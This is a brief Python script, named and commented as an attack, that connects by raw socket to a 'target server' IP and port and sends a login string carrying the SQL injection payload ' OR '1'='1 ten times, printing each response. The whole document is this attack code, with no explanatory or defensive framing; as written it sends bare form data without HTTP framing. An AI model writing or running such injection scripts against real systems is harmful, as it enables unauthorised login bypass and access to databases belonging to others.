import socket

target_ip = "111.11.11.111"  # IP address of the target server
target_port = 9999

def sql_injection_attack():
    payload = "' OR '1'='1"
    message = f"username={payload}&password=anything"

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, target_port))
        s.sendall(message.encode())
        response = s.recv(1024)
        print(f"Received: {response.decode()}")

# Number of requests to send
num_requests = 10

for _ in range(num_requests):
    sql_injection_attack()
